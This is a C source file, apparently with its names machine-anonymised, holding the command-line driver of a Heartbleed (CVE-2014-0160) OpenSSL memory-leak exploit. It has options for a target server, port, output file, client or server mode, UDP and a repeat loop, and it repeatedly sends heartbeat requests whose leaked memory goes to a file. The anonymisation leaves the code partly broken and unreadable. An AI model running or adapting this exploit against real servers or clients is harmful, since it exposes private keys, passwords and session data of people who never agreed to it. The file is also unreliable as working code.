
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_10__ TYPE_1__ ;


struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct option {char* member_0; int member_1; char member_3; int member_2; } ;
struct hostent {int dummy; } ;
typedef int socklen_t ;
typedef int peer ;
struct TYPE_10__ {int socket; int sslHandle; } ;
typedef TYPE_1__ connection ;


 int FUNC_0 (int ) ;
 int FUNC_1 (int ) ;
 int FUNC_2 (int,int ,int ) ;
 int FUNC_3 (char*) ;
 int FUNC_4 (int) ;
 TYPE_1__* FUNC_5 (int,char*,int) ;
 TYPE_1__* FUNC_6 (int,char*,int) ;
 int FUNC_7 (TYPE_1__*,int) ;
 int FUNC_8 (TYPE_1__*,char*,int) ;
 int FUNC_9 (int) ;
 scalar_t__ VAR_0 ;
 int FUNC_10 () ;
 struct hostent* FUNC_11 (char*) ;
 int FUNC_12 (int,char**,char*,struct option*,int*) ;
 int FUNC_13 (TYPE_1__*,int) ;
 char* FUNC_14 (int) ;
 char* VAR_1 ;
 int FUNC_15 (int,int,int) ;
 int FUNC_16 (char*,...) ;
 scalar_t__ FUNC_17 (int ,char*,int,int ,struct sockaddr*,int*) ;
 int VAR_2 ;
 int FUNC_18 (TYPE_1__*,char*,int) ;
 int FUNC_19 (char*,char*,char*) ;
 int FUNC_20 () ;
 int FUNC_21 (char*) ;
 int FUNC_22 (char*,int) ;
 int FUNC_23 (char*,int) ;
 TYPE_1__* FUNC_24 (int) ;
 TYPE_1__* FUNC_25 (int) ;
 int FUNC_26 () ;

int FUNC_27(int VAR_3, char* VAR_4[]){
 int VAR_5, VAR_6, VAR_7, VAR_8;
 int VAR_9 = 1, VAR_10 = 0, VAR_11 = 0, VAR_12 = 0, VAR_13 = 9;
 int VAR_14 = 0;
 struct hostent *VAR_15;
 connection* VAR_16;
 char *VAR_17, *VAR_18;
 int VAR_19 = 0, VAR_20 = 0, VAR_21 = 0, VAR_22 = 0, VAR_23 = 0;
 FUNC_16("[ heartbleed - CVE-2014-0160 - OpenSSL information leak exploit\n");
 FUNC_16("[ =============================================================\n");
        static struct option VAR_24[] = {
         {"server", 1, 0, 's'},
         {"port", 1, 0, 'p'},
  {"file", 1, 0, 'f'},
  {"type", 1, 0, 't'},
  {"bind", 1, 0, 'b'},
  {"verbose", 0, 0, 'v'},
  {"precmd", 1, 0, 'c'},
  {"loop", 0, 0, 'l'},
  {"help", 0, 0,'h'},
  {"udp", 0, 0, 'u'}
        };
 while(VAR_7 != -1) {
         VAR_7 = FUNC_12(VAR_3,VAR_4,"s:p:f:t:b:c:lvhu",VAR_24,&VAR_8);
         switch(VAR_7) {
                 case -1:
                         break;
                 case 's':
    if(VAR_19==0){
     VAR_19 = 1;
     VAR_15 = FUNC_11(VAR_1);
     if(VAR_15==((void*)0)){
      FUNC_16("[!] FATAL: unknown host '%s'\n",VAR_1);
      FUNC_9(1);
     }
     VAR_17 = FUNC_14(FUNC_21(VAR_1) + 1);
     if(VAR_17==((void*)0)){
                    FUNC_16("[ error in malloc()\n");
                    FUNC_9(0);
            }
     FUNC_19(VAR_17,"%s",VAR_1);
                  }
    break;
                 case 'p':
    if(VAR_20==0){
     VAR_6 = FUNC_3(VAR_1);
     VAR_20 = 1;
    }
                         break;
   case 'f':
    if(VAR_21==0){
     VAR_18 = FUNC_14(FUNC_21(VAR_1) + 1);
     if(VAR_18==((void*)0)){
                    FUNC_16("[ error in malloc()\n");
                    FUNC_9(0);
            }
     FUNC_19(VAR_18,"%s",VAR_1);
     VAR_21 = 1;
    }
    break;
   case 't':
    if(VAR_22==0){
     VAR_9 = FUNC_3(VAR_1);
     VAR_22 = 1;
    }
    break;
   case 'h':
    FUNC_26();
    break;
   case 'b':
    if(VAR_19==0){
     VAR_19 = 1;
     VAR_17 = FUNC_14(FUNC_21(VAR_1)+1);
     if(VAR_17==((void*)0)){
                     FUNC_16("[ error in malloc()\n");
                    FUNC_9(0);
            }
     FUNC_19(VAR_17,"%s",VAR_1);
     VAR_12 = 1;
    }
    break;
   case 'c':
    if(VAR_23 == 0){
     VAR_23 = 1;
     VAR_13 = FUNC_3(VAR_1);
    }
    break;
   case 'v':
    VAR_11 = 1;
    break;
   case 'l':
    VAR_14 = 1;
    break;
                 case 'u':
    VAR_10 = 1;
    break;

   default:
    break;
  }
 }
 if(VAR_19==0||VAR_20==0||VAR_21==0||VAR_22==0){
  FUNC_16("[ try --help\n");
  FUNC_9(0);
 }
 FUNC_20();
 if(VAR_12==0){
  if (VAR_10){
   VAR_16 = FUNC_5(VAR_5, VAR_17, VAR_6);
   FUNC_7(VAR_16, VAR_9);
   FUNC_8(VAR_16,VAR_18,VAR_11);
   while(VAR_2==1){
    FUNC_8(VAR_16,VAR_18,VAR_11);
   }
   while(VAR_14==1){
    FUNC_16("[ entered heartbleed loop\n");
    VAR_0=0;
    VAR_2=1;
    FUNC_7(VAR_16,VAR_9);
    while(VAR_2==1){
     FUNC_8(VAR_16,VAR_18,VAR_11);
    }
   }
  }
  else {
   VAR_5 = FUNC_23(VAR_17, VAR_6);
   FUNC_15(VAR_5, VAR_13, VAR_11);
   VAR_16 = FUNC_25(VAR_5);
   FUNC_13(VAR_16,VAR_9);
   while(VAR_2==1){
    FUNC_18(VAR_16,VAR_18,VAR_11);
   }
   while(VAR_14==1){
    FUNC_16("[ entered heartbleed loop\n");
    VAR_0=0;
    VAR_2=1;
    FUNC_13(VAR_16,VAR_9);
    while(VAR_2==1){
     FUNC_18(VAR_16,VAR_18,VAR_11);
    }
   }
  }

  FUNC_1(VAR_16->sslHandle);
  FUNC_4 (VAR_5);
  FUNC_0(VAR_16->sslHandle);
 }
 else{
  int VAR_25, VAR_26, VAR_27;
  if (VAR_10) {
   VAR_16 = FUNC_6(VAR_25, VAR_17, VAR_6);
   while (1) {
    char * VAR_28 = FUNC_14(1024);
    struct sockaddr_in VAR_29;
    socklen_t VAR_30 = sizeof(VAR_29);
     if (FUNC_17(VAR_16->socket,VAR_28,1023,0,(struct sockaddr *)&VAR_29,&VAR_30) > 0) {
     FUNC_7(VAR_16,VAR_9);
     FUNC_8(VAR_16,VAR_18,VAR_11);
      while(VAR_14==1){
       FUNC_16("[ entered heartbleed loop\n");
       VAR_0=0;
       VAR_2=0;
       FUNC_7(VAR_16,VAR_9);
       while(VAR_2==1){
        FUNC_8(VAR_16,VAR_18,VAR_11);
       }
      }
     }
   }
  }
  else {
   VAR_5 = FUNC_22(VAR_17, VAR_6);
   while(1){
          VAR_25=FUNC_2(VAR_5,0,0);
    if(VAR_25==-1){
     FUNC_16("[!] FATAL: problem with accept()\n");
     FUNC_9(0);
    }
    if((VAR_26=FUNC_10())){
     FUNC_4(VAR_25);
    }
          else{
     VAR_16 = FUNC_24(VAR_25);
     FUNC_15(VAR_5, VAR_13, VAR_11);
     FUNC_13(VAR_16,VAR_9);
     while(VAR_2==1){
      FUNC_18(VAR_16,VAR_18,VAR_11);
     }
     while(VAR_14==1){
      FUNC_16("[ entered heartbleed loop\n");
      VAR_0=0;
      VAR_2=0;
      FUNC_13(VAR_16,VAR_9);
      while(VAR_2==1){
       FUNC_18(VAR_16,VAR_18,VAR_11);
      }
     }
     FUNC_16("[ done.\n");
     FUNC_9(0);
    }
   }
  }
 }
}
